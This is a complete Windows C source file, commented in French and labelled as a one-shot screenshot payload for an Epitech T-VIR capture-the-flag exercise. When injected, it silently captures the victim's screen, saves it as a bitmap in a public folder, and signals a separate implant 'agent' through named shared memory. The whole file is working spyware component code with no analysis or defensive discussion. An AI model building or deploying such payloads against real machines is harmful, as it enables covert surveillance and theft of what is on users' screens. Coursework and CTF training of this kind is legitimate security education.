// ============================================================================
// SCREENSHOT PAYLOAD - ONE SHOT - EPITECH T-VIR CTF
// ============================================================================
// 1 inject = 1 screenshot.
// Prend le screenshot → sauvegarde en BMP → signale via shared memory →
// attend que l'agent acquitte (has_new_data = 0) → quitte.
// ============================================================================

#include <windows.h>
#include <stdio.h>

// ============================================================================
// CONFIGURATION
// ============================================================================
#define SHARED_MEMORY_NAME  "Local\\ScreenshotSharedMem"
#define SCREENSHOT_PATH     "C:\\Users\\Public\\screenshot.bmp"
#define ACK_TIMEOUT_MS      30000   // 30 sec max pour que l'agent lise

// ============================================================================
// STRUCTURE DE LA MÉMOIRE PARTAGÉE
// ============================================================================
typedef struct {
    volatile LONG has_new_data;          // 1 = screenshot dispo, 0 = lu par l'agent
    volatile LONG is_active;             // 1 = payload actif
    volatile LONG screenshot_size;       // taille du fichier BMP
    char screenshot_path[MAX_PATH];      // chemin du fichier BMP
} SharedScreenshotData;

// ============================================================================
// FONCTION - Capturer l'écran et sauvegarder en BMP
// ============================================================================
static int CaptureScreenToBMP(const char* filepath) {
    int screenWidth  = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return -1;

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) { ReleaseDC(NULL, hdcScreen); return -1; }

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    if (!hBitmap) { DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen); return -1; }

    HBITMAP hOld = (HBITMAP)SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    DWORD rowSize   = ((screenWidth * 3 + 3) & ~3);
    DWORD imageSize = rowSize * screenHeight;

    BITMAPINFOHEADER bi = {0};
    bi.biSize      = sizeof(bi);
    bi.biWidth     = screenWidth;
    bi.biHeight    = screenHeight; // bottom-up pour GetDIBits
    bi.biPlanes    = 1;
    bi.biBitCount  = 24;
    bi.biCompression = BI_RGB;

    BITMAPFILEHEADER bf = {0};
    bf.bfType    = 0x4D42; // "BM"
    bf.bfOffBits = sizeof(bf) + sizeof(bi);
    bf.bfSize    = bf.bfOffBits + imageSize;

    BYTE* pixels = (BYTE*)malloc(imageSize);
    if (!pixels) {
        SelectObject(hdcMem, hOld); DeleteObject(hBitmap);
        DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
        return -1;
    }

    BITMAPINFO bmi = {0};
    bmi.bmiHeader = bi;
    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pixels, &bmi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        free(pixels);
        SelectObject(hdcMem, hOld); DeleteObject(hBitmap);
        DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
        return -1;
    }

    DWORD w;
    WriteFile(hFile, &bf, sizeof(bf), &w, NULL);
    WriteFile(hFile, &bi, sizeof(bi), &w, NULL);
    // GetDIBits = bottom-up → écrire de bas en haut pour obtenir top-down
    for (int y = screenHeight - 1; y >= 0; y--)
        WriteFile(hFile, pixels + (DWORD)y * rowSize, rowSize, &w, NULL);

    CloseHandle(hFile);
    free(pixels);
    SelectObject(hdcMem, hOld); DeleteObject(hBitmap);
    DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);

    return (int)bf.bfSize;
}

// ============================================================================
// MAIN
// ============================================================================
int main(void) {
    // Créer la shared memory
    HANDLE hMapFile = CreateFileMappingA(
        INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
        0, sizeof(SharedScreenshotData), SHARED_MEMORY_NAME);
    if (!hMapFile) return -1;

    SharedScreenshotData* pData = (SharedScreenshotData*)MapViewOfFile(
        hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(SharedScreenshotData));
    if (!pData) { CloseHandle(hMapFile); return -1; }

    pData->has_new_data = 0;
    pData->is_active    = 1;
    pData->screenshot_size = 0;
    strncpy(pData->screenshot_path, SCREENSHOT_PATH, MAX_PATH - 1);

    // Prendre le screenshot
    int size = CaptureScreenToBMP(SCREENSHOT_PATH);
    if (size <= 0) {
        pData->is_active = 0;
        UnmapViewOfFile(pData);
        CloseHandle(hMapFile);
        return -1;
    }

    // Signaler à l'agent
    pData->screenshot_size = (LONG)size;
    InterlockedExchange(&pData->has_new_data, 1);

    // Attendre que l'agent acquitte (has_new_data → 0) ou timeout
    DWORD elapsed = 0;
    while (pData->has_new_data == 1 && elapsed < ACK_TIMEOUT_MS) {
        Sleep(500);
        elapsed += 500;
    }

    // Cleanup et quitter
    pData->is_active = 0;
    UnmapViewOfFile(pData);
    CloseHandle(hMapFile);

    return 0;
}
